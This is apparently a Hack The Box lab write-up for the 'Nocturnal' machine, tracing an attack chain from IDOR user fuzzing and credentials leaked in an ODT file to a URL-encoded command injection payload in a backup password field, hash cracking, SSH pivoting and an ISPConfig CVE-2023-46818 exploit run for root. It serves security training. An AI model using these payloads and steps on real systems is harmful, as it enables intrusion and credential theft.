<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Z4B0-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Web_Security-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-CWES(Hack_The_Box)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-In_Progress-16a34a?style=flat-square" />

</div>

---

## Nocturnal — Hack The Box Write-Up

<div align="left">

![Category: Web](https://img.shields.io/badge/Category-Web-red)<br>
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

Nocturnal is a Medium Linux machine focused on broken access control, command injection, credential abuse, and local service exploitation, demonstrating how a simple IDOR vulnerability can escalate into full root compromise when chained correctly.

- IDOR exploitation
- Credential extraction from ODT
- Command injection via backup feature
- SQLite database dumping
- Hash cracking & SSH pivot
- ISPConfig exploitation (CVE-2023-46818)
- Full privilege escalation to root

---

## 🛠 Tools

```
nmap        → service discovery
ffuf        → user fuzzing (IDOR validation)
burpsuite   → request interception
sqlite3     → database extraction
hashcat     → password cracking
ssh         → lateral movement
python3     → ISPConfig exploit execution
```

---

## Reconnaissance & Enumeration

### Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG allPorts
```

![image](images/noc1.png)

Results

```
22/tcp open  ssh
80/tcp open  http
```

Add host:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

Visit:

```
http://nocturnal.htb
```

![image](images/noc2.png)

Application allows registration and login.

---

## Initial Web Access

After registering and logging in, a file upload feature becomes available.

![image](images/noc3.png)
![image](images/noc4.png)

Directory enumeration reveals:

```
view.php
```

![image](images/noc5.png)

URL structure:

```
http://nocturnal.htb/view.php?username=USER&file=FILE
```

Intercepted parameters:

```
username=
file=
```

Initial thought: LFI
Actual issue: Broken Access Control (IDOR)

---

## IDOR Exploitation

IDOR allows direct access to objects by modifying identifiers without authorization checks.

Example:

```
view.php?username=amanda&file=privacy.odt
```

To enumerate valid users:

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' \
-w wordlist.txt \
-mc 200 \
-fr "User not found." \
-H "Cookie: PHPSESSID=YOUR-COOKIE"
```

![image](images/noc6.png)

Valid users discovered:

- amanda
- tobias
- admin

Testing manually shows:

```
amanda → privacy.odt
```

---

## Credential Extraction from ODT

Download file:

![image](images/noc7.png)

Extract contents:

```bash
unzip privacy.odt
```

Inside `content.xml`:

```
Username: amanda
Password: arHkG7HAI68X8s1J
```

![image](images/noc8.png)

Login as Amanda.

---

## Admin Panel & Command Injection

Amanda’s dashboard reveals:

“Go to Admin Panel”

![image](images/noc9.png)

Backup feature allows password input.

![image](images/noc10.png)

Testing input reveals command execution behavior.

Payload used:

```
%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump%09>%09/tmp/nocturnal.txt"%0A
```

Decoded:

```bash
bash -c "sqlite3 /var/www/nocturnal_database/nocturnal_database.db .dump > /tmp/nocturnal.txt"
```

![image](images/noc11.png)

Database successfully dumped.

Retrieve contents:

```bash
cat /tmp/nocturnal.txt
```

Hash for `tobias` extracted.

---

## Hash Cracking

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```
slowmotionapocalypse
```

---

## SSH Pivot

```bash
ssh tobias@nocturnal.htb
```

Password:

```
slowmotionapocalypse
```

User access confirmed.

```bash
cat user.txt
```

![image](images/noc12.png)

---

## Privilege Escalation

### ISPConfig Discovery

Under `/var/www`:

![image](images/noc13.png)

Check services:

```bash
netstat -tulnp
```

Port 8080 running locally.

ISPConfig identified (web-based hosting control panel).

---

### Port Forwarding

```bash
ssh -L 8080:localhost:8080 tobias@nocturnal.htb
```

Access locally:

```
http://localhost:8080
```

![image](images/noc14.png)

Login successful with:

```
Username: admin
Password: slowmotionapocalypse
```

![image](images/noc15.png)

---

## Exploiting CVE-2023-46818

CVE-2023-46818 allows authenticated remote command execution in vulnerable ISPConfig versions.

Exploit copied to `/tmp`:

![image](images/noc16.png)

Execute:

```bash
python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
```

Root shell obtained.

---

## Root Flag

```bash
cat /root/root.txt
```

![image](images/noc17.png)

Root access confirmed.

---

## Attack Flow

1. Service enumeration (SSH, HTTP)
2. Identified IDOR in `view.php`
3. Fuzzed usernames
4. Retrieved Amanda’s ODT file
5. Extracted credentials
6. Accessed admin panel
7. Exploited command injection
8. Dumped SQLite database
9. Cracked Tobias hash
10. SSH access gained
11. Discovered local ISPConfig
12. Port-forwarded service
13. Exploited CVE-2023-46818
14. Privilege escalation to root

## 🧠 What This Machine Teaches

- Broken access control can be catastrophic
- Structured document formats often leak sensitive data
- Command injection may hide in logic-based features
- Credential reuse multiplies impact
- Local services frequently provide escalation paths

---

## 📌 Conclusion

Nocturnal demonstrates how structured enumeration and logical vulnerability chaining lead to full system compromise without brute force.

> _Credential reuse multiplies impact_

---

This work is part of **FuzzRaiders’ structured hands-on training and research program**, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor, and real-world security execution

Happy hacking 🚀

# Author: Z4B0 [LinkedIn](https://www.linkedin.com/in/mahamud-abdirahman-151493375/)
